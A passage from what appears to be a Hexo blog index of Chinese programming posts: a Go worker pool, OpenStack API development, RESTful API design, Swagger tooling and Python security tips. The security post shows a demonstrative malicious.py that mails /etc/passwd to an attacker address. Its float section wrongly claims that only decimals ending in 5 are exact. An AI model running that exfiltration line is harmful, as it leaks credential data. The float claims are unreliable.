Worker) Start() &#123; go func() &#123; for &#123; // register the current worker into the worker queue. w.WorkerPool &lt;- w.InputQueue select &#123; // we have received a work request case job := &lt;-w.InputQueue: job.task() // we have received a signal to stop case &lt;-w.QuitQueue: return &#125; &#125; &#125;()&#125;// Stop signals the worker to stop listening for work requests.func (w Worker) Stop() &#123; go func() &#123; w.QuitQueue &lt;- true &#125;()&#125;// NewGoroutinePool is a factory function to new a GoroutinePoolfunc NewGoroutinePool(maxWorkers int, maxQueue int) *GoroutinePool &#123; return &amp;GoroutinePool&#123; WorkerPool: make(chan chan Job, maxWorkers), JobQueue: make(chan Job, maxQueue), ResultQueue: make(chan Result, maxQueue), maxWorkers: maxWorkers, maxQueue: maxQueue, &#125;&#125;// dispatch use to dispatch the jobfunc (d *GoroutinePool) dispatch() &#123; for &#123; select &#123; case job := &lt;-d.JobQueue: // a job request has benn received go func(job Job) &#123; // try to obtain a worker job channel that is available. // this will block until a worker is idle jobChan := &lt;-d.WorkerPool // dispatch the job to the worker jobChan jobChan &lt;- job &#125;(job) &#125; &#125;&#125;// Run use to starting n number os workersfunc (d *GoroutinePool) Run() &#123; for i := 0; i &lt; d.maxWorkers; i++ &#123; worker := NewWorker(i+1, d.WorkerPool) worker.Start() &#125; go d.dispatch()&#125;// AddJob is a method to add job to job channelfunc (d *GoroutinePool) AddJob(job Job) (msg string, err error) &#123; JobQueue &lt;- job return "add a job to Job queue", nil&#125; 测试]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何开发Openstack服务-开篇(一)]]></title>
      <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
      <content type="text"><![CDATA[openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。 openstack简介openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务 API通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。 CLI/SDK通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作 WebUI通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用 因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。 openstack架构整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo openstack中的api服务openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持RESTful API的开发, 有些框架还专门为RESTful API的开发提供了便利的功能,比如Pecan，有些框架则通过第三方模块来提供这种便利，比如Django和Flask都有不少和REST相关的第三方库。对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错下面是openstack keystone关于credential的API: 早期项目的api服务OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan 新项目的api服务Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RESTful API 设计规范]]></title>
      <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
      <content type="text"><![CDATA[做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客理解RESTful架构 , 这里同时也参考了他的另一篇博客RESTful API 设计指南在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题Principles of good RESTful API Design 定义 这里有一些非常重要的术语，我将在本文里面一直用到它们 资源(Resource)：一个对象的单独实例，如一只动物 集合(Collection)：一群同种对象，如动物 HTTP：跨网络的通信协议 客户端(Consumer)：可以创建HTTP请求的客户端应用程序 第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据 服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它 端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合 幂等(Idempotent)：无边际效应，多次操作得到相同的结果 URL段(Segment)：在URL里面已斜杠分隔的内容 数据设计与抽象 理清业务数据流程 规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作 往往就是需要写好 PRD和DRD这些功能文档 站在使用者的角度进行合理抽象 有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能 通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者， 否则他们是不会使用你的API的。 如何开放API 当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。 HTTP 动词一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。 GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。 POST （创建）： 在服务器上创建一个新的资源。 PUT （更新）：以整体的方式更新服务器上的一个资源。 PATCH （更新）：只更新服务器上一个资源的一个属性。 DELETE （删除）：删除服务器上的一个资源。 HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。 OPTIONS：获取客户端能对资源做什么操作的信息。 域名 域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法 应该尽量将API部署在专用域名之下。 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。 12https://api.example.com # 专业域名https://example.org/api/ # URI中明确说明 版本化 API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容， 那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变， 又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。 随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。 而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。 如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。 因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。 这里实现方式有2种： 应该将API的版本号放入URL 将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法 1234567891011121314151617181920https://api.example.com/v1/ # 在URL中说明curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本 HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints 一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词， 而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的 “集合”（collection），所以API中的名词也应该使用复数。 请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。 当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) 过滤和排序 使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。 如果记录数量很多，服务器不可能都将它们返回给用户。 从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。 从服务器角度来说，响应请求越小负载就越小。 1234?limit=10: 减少返回给客户端的结果数量（用于分页）?offset=10: 发送一堆信息给客户端（用于分页）?animal_type_id=1: 使用条件匹配来过滤记录?sortby=name&amp;order=asc: 对结果按特定属性进行排序 状态码 服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证， 状态码的完整定义请看HTTP1.1/rfc Status Code define 1234567891011121314151617181920状态码范围说明：1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。常见的一些状态码：200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）204 NO CONTENT - [DELETE]：用户删除数据成功。400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 错误处理如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。 123&#123; error: "Invalid API key"&#125; 返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。 123456GET /collection: 返回一系列资源对象GET /collection/resource: 返回单独的资源对象POST /collection: 返回新创建的资源对象PUT /collection/resource: 返回完整的资源对象PATCH /collection/resource: 返回完整的资源对象DELETE /collection/resource: 返回一个空文档 Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么 Hypermedia API的设计被称为HATEOAS link: 用户读取这个属性就知道下一步该调用什么API了 rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址） href: API的绝对路径 title: API的标题,用于概述用途 type: API 响应的数据类型 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; 认证 认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用 JWT（Json Web Token） 关于OAuth的简介可以参考阮一峰OAuth2.0简介 关于JWT参考此文JWT使用 内容类型 XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json 1234567891011121314151617181920212223242526请求报文POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;响应报文HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用swagger设计出漂亮的RESTful API]]></title>
      <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
      <content type="text"><![CDATA[按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而Swagger就是其中一种比较优秀的 RESTful API设计工具。 swagger 工具简介swagger是一个RESTful API 的设计工具，官方提供3种工具： swagger-editor 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成 swagger-ui 展示工具，将编辑器定义好的json描述文件友好展示的工具。 swagger-codegen 生成服务端和客户端的代码。 因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。 编辑器(editor)可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。 部署本地编辑器安装docker，配置镜像加速，然后拉去镜像到本地运行12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor 使用本地编辑器推荐使用vscode作为编辑器, 安装vscode的Swagger View插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。 swagger2.0语法详情参考swagger2.0官方规范 格式采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。 文件结构为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json 数据类型用于描述一个数据的数据类型，对象定义时使用。 Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. 规范规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段 字段名 类型 描述 swagger string 必填项。表示使用的swagger的版本，必须为2.0 info Info Object 必填项。提供API的一些元数据描述 host string 提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。 basePath string API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头 schemes [string] API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择 consumes [string] 一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型 produces [string] MIME类型的api可以产生的列表。 值必须是所描述的Mime类型 paths 路径对象 必填项。可用的路径和操作的API definitions 定义对象 一个对象数据类型定义 parameters 参数定义对象 定义请求参数的对象 responses 反应定义对象 定义请求响应对象 securityDefinitions 安全定义对象 安全方案定义规范,比如认证 security 安全需求对象 这里主要指使用哪种认证手段 tags 标签对象 没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的 externalDocs 外部文档对象 额外的外部文档, 指向外部url 渲染器(ui)swagger-ui的使用很简单swager-ui官方文档 HTML文档渲染渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器 PDF文档渲染将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf 使用swagger2markup来生成asciiDoc格式的文档下载swagger2markup工具,下载地址,选择你想要的版本下载使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称： 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger 使用asciidoctor来将asciiDoc换换成PDF这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：madduci/docker-asciidoctor-pdf由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，镜像使用说明 Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document 这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法： 添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些默认提供的字体 1234➜ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf 修改主题配置default-theme.yml的Noto Serif字段，使用该字体:配置文件下载地址默认配置文件下载地址 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt 最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去: 123➜ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc 最后查看asiidoc下面就会有生成的pdf文件 代码生成器(codegen)swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成生成server端代码：生成客户端代码：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Python中的一些安全建议]]></title>
      <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
      <content type="text"><![CDATA[由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。 input函数在Python 2大量的内置功能集合中，input完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：12345678910➜ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()➜ ~ 显然，必须永远不使用input函数，除非脚本的标准输入中的数据是完全可信的。 Python 2文档建议将raw_input作为一个安全的替代品。在Python 3中，input函数等同于raw_input，从而一劳永逸地解决了这个隐患 assert语句在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。 不要使用is来比较int在我们的印象里，int是不可变对象，我们来看看下面这个例子12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue 为了避免每次给经常使用到这部分整数分配一个新的内存，Python预先生成并缓存好这些常用整数([-5, 257))，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。 float的舍入问题因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算我们看看下面一个有趣的现象。1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 我看到有位网友的提出的解决方案： 我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。 私有属性Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True 如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞 模块执行语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined 猴子补丁运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。 Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, 